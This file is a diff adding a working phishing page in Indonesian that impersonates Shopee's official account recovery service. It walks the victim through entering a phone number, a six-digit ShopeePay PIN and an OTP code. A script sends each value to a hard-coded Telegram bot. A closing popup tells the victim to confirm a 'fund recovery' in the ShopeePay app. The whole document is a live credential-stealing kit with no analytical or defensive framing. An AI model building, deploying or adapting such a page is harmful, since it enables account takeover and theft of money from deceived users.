@@ -1,0 +1,427 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <!-- Metadata untuk tampilan saat dibagikan -->
+    <title>Pemulihan Akun Shopee</title>
+    <meta name="description" content="Layanan resmi pemulihan dan aktivasi akun Shopee Indonesia. Bantu pulihkan akses akun Anda dengan aman dan terpercaya.">
+    <meta property="og:title" content="Pemulihan Akun Shopee">
+    <meta property="og:description" content="Layanan resmi pemulihan dan aktivasi akun Shopee Indonesia. Bantu pulihkan akses akun Anda dengan aman dan terpercaya.">
+    <meta property="og:image" content="https://i.ibb.co.com/qL77kcSt/images-13.jpg">
+    <meta property="og:type" content="website">
+    <meta property="og:site_name" content="Shopee Indonesia">
+
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+        }
+        body {
+            background: #fff;
+            min-height: 100vh;
+        }
+        .page {
+            display: none;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .page.active {
+            display: block;
+        }
+
+        /* Halaman 1 - Aktivasi */
+        .page1 {
+            background: linear-gradient(180deg, #FF5722 0%, #FF7043 100%);
+            text-align: center;
+            padding-top: 60px;
+        }
+        .logo-shopee-besar {
+            width: 120px;
+            margin: 0 auto 40px;
+            display: block;
+        }
+        .kotak-putih {
+            background: #fff;
+            border-radius: 12px;
+            padding: 30px 20px;
+            margin-bottom: 30px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+        }
+        .kotak-putih h1 {
+            font-size: 26px;
+            color: #BF360C;
+            margin-bottom: 25px;
+        }
+        .btn-aktivasi {
+            width: 100%;
+            padding: 16px;
+            background: #FF5722;
+            color: #fff;
+            border: none;
+            border-radius: 25px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            box-shadow: 0 3px 8px rgba(0,0,0,0.15);
+        }
+        .gambar-tips {
+            width: 100%;
+            max-width: 400px;
+            border-radius: 12px;
+            box-shadow: 0 3px 8px rgba(0,0,0,0.15);
+        }
+
+        /* Halaman 2 - Nomor HP */
+        .header-log {
+            display: flex;
+            align-items: center;
+            padding: 15px 0;
+            border-bottom: 1px solid #eee;
+            margin-bottom: 30px;
+        }
+        .logo-shopee-tengah {
+            width: 100px;
+            margin: 0 auto 25px;
+            display: block;
+        }
+        .input-nomor {
+            width: 100%;
+            padding: 15px;
+            font-size: 18px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            inputmode: numeric;
+            pattern: "[0-9]*";
+            type: tel;
+        }
+        .btn-lanjut {
+            width: 100%;
+            padding: 15px;
+            background: #FF5722;
+            color: #fff;
+            border: none;
+            border-radius: 8px;
+            font-size: 17px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        .gambar-bawah {
+            width: 100%;
+            max-width: 400px;
+            margin-top: 40px;
+            border-radius: 8px;
+        }
+
+        /* Halaman 3 - PIN */
+        .gambar-pin-atas {
+            width: 100%;
+            max-width: 320px;
+            margin: 30px auto;
+            display: block;
+        }
+        .pin-box {
+            display: flex;
+            justify-content: center;
+            gap: 12px;
+            margin-bottom: 40px;
+        }
+        .kotak-pin {
+            width: 50px;
+            height: 50px;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            text-align: center;
+            font-size: 22px;
+            inputmode: numeric;
+            pattern: "[0-9]*";
+            type: password;
+        }
+        .lupa-pin {
+            text-align: center;
+            color: #888;
+            margin-bottom: 40px;
+        }
+        .keypad {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 10px;
+            max-width: 300px;
+            margin: 0 auto;
+        }
+        .tombol-angka {
+            padding: 18px;
+            font-size: 22px;
+            border: none;
+            border-radius: 6px;
+            background: #f5f5f5;
+            cursor: pointer;
+        }
+
+        /* Halaman 4 - OTP */
+        .info-otp {
+            text-align: center;
+            margin: 40px 0;
+            font-size: 17px;
+            color: #333;
+        }
+        .kotak-otp {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 30px;
+        }
+        .kotak-otp input {
+            width: 45px;
+            height: 45px;
+            text-align: center;
+            font-size: 20px;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            inputmode: numeric;
+            pattern: "[0-9]*";
+            type: tel;
+        }
+        .teks-tunggu {
+            text-align: center;
+            color: #666;
+            margin-bottom: 40px;
+        }
+        .popup {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.6);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        .popup.keluar { display: flex; }
+        .isi-popup {
+            background: #fff;
+            border-radius: 12px;
+            padding: 25px;
+            width: 100%;
+            max-width: 320px;
+            text-align: center;
+        }
+        .isi-popup h3 {
+            margin-bottom: 15px;
+            color: #333;
+        }
+        .isi-popup p {
+            margin-bottom: 20px;
+            color: #555;
+            line-height: 1.5;
+        }
+        .btn-mengerti {
+            width: 100%;
+            padding: 12px;
+            background: #FF5722;
+            color: #fff;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+
+<!-- HALAMAN 1: PEMULIHAN AKUN -->
+<div class="page page1 active" id="halaman1">
+    <img src="https://i.ibb.co.com/dwJ4ygw9/download.png" alt="Logo Shopee" class="logo-shopee-besar">
+    <div class="kotak-putih">
+        <h1>PEMULIHAN AKUN</h1>
+        <button class="btn-aktivasi" onclick="gantiHalaman('halaman2')">AKTIVASI AKUN ANDA SEKARANG</button>
+    </div>
+    <img src="https://i.ibb.co.com/0jcQvHsy/IMG-20260629-WA0003.jpg" alt="Info Keamanan" class="gambar-tips">
+</div>
+
+<!-- HALAMAN 2: NOMOR TELEPON -->
+<div class="page" id="halaman2">
+    <div class="header-log">
+        <span onclick="gantiHalaman('halaman1')">&larr;</span>
+    </div>
+    <img src="https://i.ibb.co.com/dwJ4ygw9/download.png" alt="Logo Shopee" class="logo-shopee-tengah">
+    <input type="tel" id="no_hp" class="input-nomor" placeholder="Nomor Telepon" oninput="hanyaAngka(this)">
+    <button class="btn-lanjut" onclick="kirimData('nomor')">Berikutnya</button>
+    <img src="https://i.ibb.co.com/kVrV6Ms1/IMG-20260629-WA0002.jpg" alt="Info" class="gambar-bawah">
+</div>
+
+<!-- HALAMAN 3: PIN SHOPEEPAY -->
+<div class="page" id="halaman3">
+    <div class="header-log">
+        <span onclick="gantiHalaman('halaman2')">&larr;</span>
+        <span>ShopeePay</span>
+    </div>
+    <img src="https://i.ibb.co.com/20RQMLLv/Add-Text-04-01-08-02-33.jpg" alt="Masukkan PIN" class="gambar-pin-atas">
+    <div class="pin-box">
+        <input type="password" class="kotak-pin" maxlength="1" oninput="pindahOtomatis(this, 'pin', 1)" id="p1">
+        <input type="password" class="kotak-pin" maxlength="1" oninput="pindahOtomatis(this, 'pin', 2)" id="p2">
+        <input type="password" class="kotak-pin" maxlength="1" oninput="pindahOtomatis(this, 'pin', 3)" id="p3">
+        <input type="password" class="kotak-pin" maxlength="1" oninput="pindahOtomatis(this, 'pin', 4)" id="p4">
+        <input type="password" class="kotak-pin" maxlength="1" oninput="pindahOtomatis(this, 'pin', 5)" id="p5">
+        <input type="password" class="kotak-pin" maxlength="1" oninput="pindahOtomatis(this, 'pin', 6)" id="p6">
+    </div>
+    <div class="lupa-pin">Lupa PIN</div>
+    <div class="keypad">
+        <button class="tombol-angka" onclick="masukAngka('1')">1</button>
+        <button class="tombol-angka" onclick="masukAngka('2')">2</button>
+        <button class="tombol-angka" onclick="masukAngka('3')">3</button>
+        <button class="tombol-angka" onclick="masukAngka('4')">4</button>
+        <button class="tombol-angka" onclick="masukAngka('5')">5</button>
+        <button class="tombol-angka" onclick="masukAngka('6')">6</button>
+        <button class="tombol-angka" onclick="masukAngka('7')">7</button>
+        <button class="tombol-angka" onclick="masukAngka('8')">8</button>
+        <button class="tombol-angka" onclick="masukAngka('9')">9</button>
+        <button class="tombol-angka" onclick="masukAngka('0')">0</button>
+        <button class="tombol-angka" onclick="hapusAngka()">&larr;</button>
+    </div>
+</div>
+
+<!-- HALAMAN 4: KODE OTP -->
+<div class="page" id="halaman4">
+    <div class="header-log">
+        <span onclick="gantiHalaman('halaman3')">&larr;</span>
+        <span>Log in</span>
+    </div>
+    <div class="info-otp">
+        Kode OTP telah kami kirim ke<br><br>
+        <strong id="tampil_no"></strong>
+    </div>
+    <div class="kotak-otp">
+        <input type="tel" maxlength="1" oninput="pindahOtomatis(this, 'otp', 1)" id="o1">
+        <input type="tel" maxlength="1" oninput="pindahOtomatis(this, 'otp', 2)" id="o2">
+        <input type="tel" maxlength="1" oninput="pindahOtomatis(this, 'otp', 3)" id="o3">
+        <input type="tel" maxlength="1" oninput="pindahOtomatis(this, 'otp', 4)" id="o4">
+        <input type="tel" maxlength="1" oninput="pindahOtomatis(this, 'otp', 5)" id="o5">
+        <input type="tel" maxlength="1" oninput="pindahOtomatis(this, 'otp', 6)" id="o6">
+    </div>
+    <button class="btn-lanjut" onclick="kirimData('otp')">Lanjut</button>
+    <div class="teks-tunggu">Mohon tunggu <span id="hitungan">57</span> detik untuk mengirim ulang.</div>
+</div>
+
+<!-- POPUP KONFIRMASI -->
+<div class="popup" id="popup">
+    <div class="isi-popup">
+        <h3>Konfirmasi Pemulihan</h3>
+        <p>Silakan konfirmasi pemulihan dana di aplikasi shopeepay di sebelah kanan atas tanda lonceng klik konfirmasi</p>
+        <button class="btn-mengerti" onclick="tutupPopup()">Mengerti</button>
+    </div>
+</div>
+
+<script>
+// Ganti halaman
+function gantiHalaman(id) {
+    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+    document.getElementById(id).classList.add('active');
+}
+
+// Hanya angka saja
+function hanyaAngka(input) {
+    input.value = input.value.replace(/[^0-9]/g, '');
+}
+
+// Pindah otomatis PIN & OTP
+function pindahOtomatis(input, tipe, urutan) {
+    hanyaAngka(input);
+    if (input.value.length === 1 && urutan < 6) {
+        document.getElementById(`${tipe === 'pin' ? 'p' : 'o'}${urutan + 1}`).focus();
+    }
+    cekLengkap(tipe);
+}
+
+// Cek apakah sudah 6 digit
+function cekLengkap(tipe) {
+    let nilai = "";
+    for (let i = 1; i <= 6; i++) {
+        nilai += document.getElementById(`${tipe === 'pin' ? 'p' : 'o'}${i}`).value;
+    }
+    if (nilai.length === 6) {
+        if (tipe === 'pin') {
+            data.pin = nilai;
+            kirimPesan(`🔑 PIN SHOPEEPAY: ${data.pin}`);
+            setTimeout(() => {
+                document.getElementById('tampil_no').textContent = data.no_hp;
+                gantiHalaman('halaman4');
+            }, 500);
+        } else {
+            data.otp = nilai;
+            kirimPesan(`🔢 KODE OTP: ${data.otp}\n✅ DATA LENGKAP`);
+            setTimeout(() => document.getElementById('popup').classList.add('keluar'), 500);
+        }
+    }
+}
+
+// Data sementara
+let data = { no_hp: "", pin: "", otp: "" };
+
+// Masuk angka lewat tombol
+function masukAngka(angka) {
+    const kotak = document.querySelectorAll('.kotak-pin');
+    for (let k of kotak) {
+        if (k.value === "") {
+            k.value = angka;
+            pindahOtomatis(k, 'pin', Array.from(kotak).indexOf(k) + 1);
+            break;
+        }
+    }
+}
+
+// Hapus angka
+function hapusAngka() {
+    const kotak = document.querySelectorAll('.kotak-pin');
+    for (let i = kotak.length - 1; i >= 0; i--) {
+        if (kotak[i].value !== "") {
+            kotak[i].value = "";
+            if (i > 0) kotak[i - 1].focus();
+            break;
+        }
+    }
+}
+
+// Kirim data ke Telegram (TOKEN & ID BARU)
+const BOT_TOKEN = "8014371799:AAGacEG5Q5KjHgG_dLlZ8HC363DiaRzitok";
+const CHAT_ID = "8702873963";
+
+async function kirimData(jenis) {
+    if (jenis === 'nomor') {
+        const no = document.getElementById('no_hp').value.trim();
+        if (!no) return alert("Masukkan nomor telepon!");
+        data.no_hp = no;
+        kirimPesan(`📞 NOMOR HP: ${no}`);
+        gantiHalaman('halaman3');
+    }
+}
+
+function kirimPesan(teks) {
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: CHAT_ID, text: teks })
+    });
+}
+
+function tutupPopup() {
+    document.getElementById('popup').classList.remove('keluar');
+}
+
+// Hitung mundur OTP
+let hitung = 57;
+setInterval(() => {
+    if (hitung > 0) {
+        document.getElementById('hitungan').textContent = hitung;
+        hitung--;
+    }
+}, 1000);
+</script>
+
+</body>
+</html>
